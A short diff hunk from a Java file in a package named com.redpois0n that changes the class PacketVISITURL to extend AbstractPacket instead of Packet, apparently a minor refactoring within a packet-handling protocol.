@@ -4,7 +4,7 @@ import java.net.URI;
 
 import com.redpois0n.Connection;
 
-public class PacketVISITURL extends Packet {
+public class PacketVISITURL extends AbstractPacket {
 
 	@Override
 	public void read(String line) throws Exception {
